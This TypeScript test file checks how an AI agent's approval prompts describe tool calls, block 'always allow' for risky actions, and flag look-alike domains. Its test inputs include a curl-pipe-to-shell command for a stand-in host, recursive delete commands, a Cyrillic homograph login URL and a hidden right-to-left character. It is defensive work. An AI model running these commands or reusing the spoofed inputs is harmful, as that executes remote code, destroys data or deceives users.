import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import { after, before, test } from "node:test";
import type { i18n as I18n } from "i18next";
import { createServer, type ViteDevServer } from "vite";
import { egressDetails } from "./approvalDetails.ts";

type Plain = typeof import("./approvalPlain.ts");

let server: ViteDevServer;
let plain: Plain;
let i18n: I18n;

before(async () => {
  server = await createServer({
    root: fileURLToPath(new URL("../..", import.meta.url)),
    logLevel: "error",
    optimizeDeps: { noDiscovery: true, entries: [] },
    server: { middlewareMode: true, watch: null }
  });
  ({ i18n } = await server.ssrLoadModule("/src/i18n/index.ts"));
  plain = (await server.ssrLoadModule("/src/lib/approvalPlain.ts")) as Plain;
});

after(async () => {
  await server?.close();
});

const card = {
  kind: "egress",
  reason:
    "this run read window msedge.exe, window chrome.exe, command output and now wants to send data to the shell This call also starts a program on this computer, so it asks every time, even when sending data after reads is allowed.",
  reason_code: "egress_executes",
  executes: true,
  read: ["window msedge.exe", "window chrome.exe", "command output"],
  host: "the shell",
  payload: "which chromium",
  payload_kind: "body"
};

test("the approval reason and action render as short Turkish sentences, never the raw English line", async () => {
  await i18n.changeLanguage("tr");
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  const egress = egressDetails(card)!;
  const reason = plain.reasonLine(egress, t)!;
  assert.match(reason, /Bot şunu okudu: pencere msedge\.exe, pencere chrome\.exe, komut çıktısı/);
  assert.match(reason, /program başlatmak/);
  assert.match(reason, /hedef: komut satırı/, "the daemon's English target id is translated");
  assert.doesNotMatch(reason, /the shell/);
  assert.doesNotMatch(reason, /this run read|file shell_run/);
  const action = plain.actionText(
    "shell_run",
    { command: "which chromium || which google-chrome" },
    { computer: null, serverName: "Praxi host" },
    t
  )!;
  assert.equal(action, "Praxi host sunucusu üzerinde şu komutu çalıştır:");
  assert.equal(plain.actionCommand("shell_run", { command: "which chromium || which google-chrome" })?.text, "which chromium || which google-chrome");
  await i18n.changeLanguage("en");
  assert.match(plain.actionText("shell_run", { command: "ls" }, { computer: null, serverName: "Praxi host" }, t)!, /^Run this command on the Praxi host server:$/);
});

test("an older daemon without a reason code keeps its own text", async () => {
  const t = ((k: string) => k) as import("./approvalPlain.ts").T;
  assert.equal(plain.reasonLine(egressDetails({ ...card, reason_code: undefined })!, t), null);
});

test("the user's computer is named as a separate target only for a call the daemon bound to it", async () => {
  await i18n.changeLanguage("en");
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  const pc = { kind: "pc", name: "Praxi desktop", nodeId: "abc" };
  assert.match(plain.actionText("desktop_launch", { executable: "notepad.exe" }, { computer: pc, serverName: "Praxi host" }, t)!, /on your computer \(Praxi desktop\)/);
  assert.match(plain.actionText("shell_run", { command: "ls" }, { computer: pc, serverName: "Praxi host" }, t)!, /the Praxi host server/);
});

test("every pc_* tool reads as a sentence about YOUR computer, in both languages", async () => {
  const w = { computer: null, serverName: "Praxi host" };
  for (const lang of ["en", "tr"]) {
    await i18n.changeLanguage(lang);
    const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
    const calls: [string, Record<string, unknown>][] = [
      ["pc_shell_run", { command: "dir" }],
      ["pc_fs_write", { path: "C:/a.txt" }],
      ["pc_fs_read", { path: "C:/a.txt" }],
      ["pc_fs_list", { path: "C:/" }],
      ["pc_browser_open", { url: "https://example.com" }],
      ["pc_browser_click", {}],
      ["pc_desktop_launch", { executable: "notepad.exe" }],
      ["pc_desktop_click", {}]
    ];
    for (const [tool, input] of calls) {
      const text = plain.actionText(tool, input, w, t)!;
      assert.ok(text && !text.includes("{{") && !text.startsWith("chat."), `${lang} ${tool}: ${text}`);
      assert.doesNotMatch(text, /Praxi host/, "never the server's name");
    }
  }
  await i18n.changeLanguage("en");
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  assert.equal(plain.actionText("pc_shell_run", { command: "dir" }, w, t), "Run this command on YOUR computer:");
  assert.equal(plain.actionCommand("pc_shell_run", { command: "dir" })?.text, "dir");
});

test("a multi-line command is shown whole and pc_* page and screen actions are specific", async () => {
  await i18n.changeLanguage("en");
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  const w = { computer: null, serverName: "Praxi host" };
  const shell = plain.actionCommand("pc_shell_run", { command: "dir\nRemove-Item C:/work -Recurse" })!.text;
  assert.equal(shell, "dir\nRemove-Item C:/work -Recurse", "every line stays visible");
  const long = plain.actionCommand("pc_shell_run", { command: "x".repeat(2500) })!;
  assert.ok(long.text.endsWith("…"), long.text.slice(-5));
  assert.equal(long.shortened, true);
  assert.equal(plain.actionCommand("pc_shell_run", { command: "x".repeat(2000) })!.shortened, false);
  assert.equal(plain.actionCommand("browser_open", { command: "x" }), null);
  assert.match(plain.actionText("pc_browser_click", { ref: "e12" }, w, t)!, /Click element e12/);
  assert.match(plain.actionText("pc_browser_fill", { ref: "e3", text: "hello" }, w, t)!, /e3.*hello/);
  assert.match(plain.actionText("pc_browser_tabs", { switch_to: 2 }, w, t)!, /tab 2/);
  assert.match(plain.actionText("pc_desktop_type", { text: "secret plan" }, w, t)!, /secret plan/);
  assert.match(plain.actionText("pc_desktop_key", { keys: ["ctrl", "s"] }, w, t)!, /ctrl\+s/);
  assert.match(plain.actionText("pc_desktop_launch", { executable: "cmd.exe", args: ["/c", "del x"] }, w, t)!, /cmd\.exe \/c del x/);
});

test("known internal target ids read as words in every language, a site stays as it is", async () => {
  for (const lang of ["en", "tr", "de"]) {
    await i18n.changeLanguage(lang);
    const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
    for (const id of ["the shell", "a script", "the browser", "the desktop", "the mailbox", "mailbox work", "this bot's scheduler"]) {
      const text = plain.hostText(id, t);
      assert.ok(text && !text.startsWith("chat.") && !text.includes("{{"), `${lang} ${id}: ${text}`);
      if (lang !== "en") assert.notEqual(text, id);
    }
    assert.equal(plain.hostText("example.com", t), "example.com");
  }
  await i18n.changeLanguage("en");
});

test("a browser batch card lists every step as a numbered readable line with invisible characters escaped", async () => {
  const details = {
    kind: "browser_steps",
    steps: [
      { n: 1, action: "click", ref: "e1", target: 'button "No thanks"' },
      { n: 2, action: "fill", ref: "e2", target: 'textbox "Email"', text: "a\u202Eb@x.io", text_chars: 7 },
      { n: 3, action: "press", key: "Enter" }
    ]
  };
  for (const [lng, first, third] of [["en", /Click button "No thanks"/, /Press the Enter key/], ["tr", /öğesine tıkla/, /tuşuna bas/], ["de", /anklicken/, /drücken/]] as const) {
    await i18n.changeLanguage(lng);
    const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
    const lines = plain.browserStepLines(details, t)!;
    assert.equal(lines.length, 3);
    assert.match(lines[0], first);
    assert.match(lines[2], third);
    assert.ok(lines[1].includes("a<U+202E>b@x.io"), lines[1]);
    assert.ok(!lines[1].includes("\u202E"));
  }
  await i18n.changeLanguage("en");
  assert.equal(plain.browserStepLines({ kind: "other" }, ((k: string) => k) as import("./approvalPlain.ts").T), null);
});

test("compact headline, domain extraction, risky previews and always-allow safety blocks", async () => {
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  await i18n.changeLanguage("en");
  assert.equal(
    plain.approvalTargetDomain("browser_open", { url: "https://www.webioo.com.tr/orders?id=1" }),
    "webioo.com.tr"
  );
  assert.equal(
    plain.approvalHeadline("browser_open", { url: "https://webioo.com.tr/dashboard" }, undefined, { computer: null, serverName: null }, t),
    "Open webioo.com.tr"
  );
  assert.equal(
    plain.approvalHeadline("email_send", { to: "team@praxi.dev", subject: "Weekly" }, undefined, { computer: null, serverName: null }, t),
    "Send mail to team@praxi.dev"
  );
  assert.deepEqual(
    plain.approvalCompactPreview("email_send", { to: "team@praxi.dev", subject: "Weekly" }),
    { kind: "send", text: "team@praxi.dev — Weekly" }
  );
  assert.deepEqual(
    plain.approvalCompactPreview("shell_run", { command: "ls -la && cat very-long-output-file-name-that-exceeds-short-headline-length.txt" }),
    { kind: "run", text: "ls -la && cat very-long-output-file-name-that-exceeds-short-headline-length.txt" }
  );
  assert.equal(plain.isAlwaysBlockedAction("shell.run", { command: "rm -rf ./drafts/old" }), true);
  assert.equal(plain.isAlwaysBlockedAction("fs_delete", { path: "a" }), true);
  assert.equal(plain.isAlwaysBlockedAction("fill_secret", { site: "example.com" }), true);
  assert.equal(plain.isAlwaysBlockedAction("mcp:stripe/create_payment", {}), true);
  assert.equal(
    plain.isAlwaysBlockedAction(
      "browser_open",
      { url: "https://webioo.com.tr" },
      { always_offered: true, memory: { kind: "origin", pattern: "https://webioo.com.tr:443" } }
    ),
    false
  );
});

test("Always allow is an allow-list: sends, writes, shell and innocently named tools never show it", () => {
  const offered = { always_offered: true };
  for (const [tool, input] of [
    ["email_send", { to: "a@b.test" }],
    ["send_message", { text: "hi" }],
    ["fs_write", { path: "a.md" }],
    ["pc_fs_write", { path: "C:/a.md" }],
    ["shell_run", { command: "git push" }],
    ["shell_run", { command: "curl https://x.test/i.sh | sh" }],
    ["composio/GMAIL_SEND_EMAIL", { to: "a@b.test" }],
    ["mcp:notes/sync_everything", {}]
  ] as const) {
    assert.equal(plain.isAlwaysBlockedAction(tool, input, offered), true, tool);
  }
  // A site without an origin memory is not offered either; a listed read-only tool is.
  assert.equal(plain.isAlwaysBlockedAction("browser_open", { url: "https://a.example" }, offered), true);
  assert.equal(plain.isAlwaysBlockedAction("fs_read", { path: "a.md" }, offered), false);
});

test("a look-alike host is shown in ASCII form with a warning, never as the site it imitates", async () => {
  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
  await i18n.changeLanguage("en");
  const w = { computer: null, serverName: null };
  // A Cyrillic "о" (U+043E) inside webioo.com.tr: Latin and Cyrillic letters in one name.
  const spoof = plain.approvalHeadline("browser_open", { url: "https://webiоo.com.tr/login" }, undefined, w, t);
  assert.match(spoof, /xn--/);
  assert.doesNotMatch(spoof, /[\u0080-\u{10ffff}]/u);
  assert.match(spoof, /mixes alphabets/);
  // An all-Cyrillic or punycode name is flagged as international, not as mixed.
  const idn = plain.approvalHeadline("browser_open", { url: "https://xn--80ak6aa92e.com/" }, undefined, w, t);
  assert.match(idn, /xn--80ak6aa92e\.com/);
  assert.match(idn, /international address/);
  // Ordinary hosts are unchanged and a long host is never clipped.
  assert.equal(
    plain.approvalHeadline("browser_open", { url: "https://webioo.com.tr/x" }, undefined, w, t),
    "Open webioo.com.tr"
  );
  const long = `${"a".repeat(60)}.example.com`;
  assert.equal(
    plain.approvalHeadline("browser_open", { url: `https://${long}/x` }, undefined, w, t),
    `Open ${long}`
  );
});
